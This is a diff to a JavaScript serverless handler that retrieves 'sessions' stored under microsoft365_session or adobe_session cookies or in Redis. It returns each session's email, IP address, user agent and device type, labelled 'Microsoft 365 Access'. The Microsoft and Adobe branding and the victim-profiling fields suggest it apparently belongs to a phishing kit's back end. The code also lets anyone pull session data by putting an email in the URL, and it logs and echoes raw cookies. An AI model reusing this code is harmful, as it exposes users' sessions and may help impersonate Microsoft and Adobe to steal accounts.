@@ -24,15 +24,26 @@ export const handler = async (event, context) => {
   }
 
   try {
+    // Check environment variables
+    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
+    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+
+    // Get parameters from URL
+    const url = event.queryStringParameters || {};
+    const sessionId = url.sessionId;
+    const email = url.email;
+
     // Try to get session from cookie first
     const cookies = event.headers.cookie || '';
     let sessionData = null;
 
     console.log('🍪 Checking cookies:', cookies);
 
-    if (cookies.includes('adobe_session=')) {
+    if (cookies.includes('microsoft365_session=') || cookies.includes('adobe_session=')) {
       try {
-        const sessionCookie = cookies.split('adobe_session=')[1].split(';')[0];
+        const sessionCookie = cookies.includes('microsoft365_session=') ? 
+          cookies.split('microsoft365_session=')[1].split(';')[0] :
+          cookies.split('adobe_session=')[1].split(';')[0];
         const decodedSession = decodeURIComponent(sessionCookie);
         sessionData = JSON.parse(decodedSession);
         console.log('✅ Session found in cookie:', sessionData.email);
@@ -42,10 +53,35 @@ export const handler = async (event, context) => {
       }
     }
 
+    // Try Redis if available and no cookie session
+    if (!sessionData && UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN && (sessionId || email)) {
+      try {
+        const { Redis } = await import('@upstash/redis');
+        const redis = new Redis({
+          url: UPSTASH_REDIS_REST_URL,
+          token: UPSTASH_REDIS_REST_TOKEN,
+        });
+
+        if (sessionId) {
+          const redisSession = await redis.get(`session:${sessionId}`);
+          if (redisSession) {
+            sessionData = JSON.parse(redisSession);
+          }
+        } else if (email) {
+          const userSession = await redis.get(`user:${email}`);
+          if (userSession) {
+            sessionData = JSON.parse(userSession);
+          }
+        }
+      } catch (redisError) {
+        console.error('❌ Redis error:', redisError);
+      }
+    }
+
     // Also check for other session indicators
     if (!sessionData && cookies.includes('logged_in=true')) {
       // Try to reconstruct session from other cookies
-      const sessionId = cookies.includes('sessionid=') ? 
+      const sessionIdFromCookie = cookies.includes('sessionid=') ? 
         cookies.split('sessionid=')[1].split(';')[0] : 
         Math.random().toString(36).substring(2, 15);
       
@@ -55,10 +91,10 @@ export const handler = async (event, context) => {
 
       sessionData = {
         email: userEmail,
-        provider: 'Unknown',
+        provider: 'Microsoft',
         fileName: 'Microsoft 365 Access',
         timestamp: new Date().toISOString(),
-        sessionId: sessionId,
+        sessionId: sessionIdFromCookie,
         clientIP: event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown',
         userAgent: event.headers['user-agent'] || 'Unknown',
         deviceType: event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop',
@@ -77,7 +113,9 @@ export const handler = async (event, context) => {
         body: JSON.stringify({ 
           success: false, 
           message: 'No active session found',
-          cookies: cookies
+          cookies: cookies,
+          sessionId: sessionId,
+          email: email
         }),
       };
     }
@@ -89,8 +127,8 @@ export const handler = async (event, context) => {
         success: true,
         session: {
           email: sessionData.email,
-          provider: sessionData.provider,
-          fileName: sessionData.fileName,
+          provider: sessionData.provider || 'Microsoft',
+          fileName: sessionData.fileName || 'Microsoft 365 Access',
           timestamp: sessionData.timestamp,
           sessionId: sessionData.sessionId,
           clientIP: sessionData.clientIP || event.headers['x-forwarded-for'] || 'Unknown',
